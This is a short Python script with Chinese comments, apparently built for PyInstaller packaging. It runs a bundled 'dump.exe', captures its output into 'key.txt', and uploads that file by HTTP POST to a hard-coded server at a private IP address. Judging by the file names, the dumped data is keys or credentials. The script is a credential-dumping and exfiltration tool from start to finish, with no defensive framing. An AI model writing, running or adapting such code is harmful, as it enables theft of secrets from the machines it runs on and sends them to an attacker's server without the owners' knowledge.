import os
import subprocess
import requests
import sys

URL = "http://192.168.102.36:444/upload"
# 获取当前脚本的所在路径

# 获取当前脚本所在路径，适用于 PyInstaller 打包后的情况
if getattr(sys, 'frozen', False):
    # 如果是通过 PyInstaller 打包的程序运行
    current_dir = os.path.dirname(sys.executable)
current_dir = os.path.dirname(os.path.abspath(__file__))

print(f"当前脚本所在的路径: {current_dir}")


# 目标 exe 文件路径
exe_path = current_dir + "\\dump.exe"

# 输出文件路径
output_file = current_dir + "\\key.txt"

# 打开文件进行写入
with open(output_file, 'w') as f:
    # 启动 exe 文件并将其输出和错误都重定向到同一个文件
    process = subprocess.Popen([exe_path], stdout=f, stderr=f, text=True)
    
    # 等待进程完成
    process.wait()

    # 获取子进程的返回码
    return_code = process.returncode
    print(f"子进程的返回码: {return_code}")


def upload_file(file_path, url):
    """
    上传文件到指定URL

    :param file_path: 要上传的文件路径
    :param url: 目标URL
    :return: 服务器响应内容
    """
    # 打开文件
    with open(file_path, 'rb') as file:
        # 上传的文件
        files = {'file': file}

        # 发送POST请求上传文件
        response = requests.post(url, files=files)

    # 返回响应内容
    return response.text

upload_file(output_file, URL)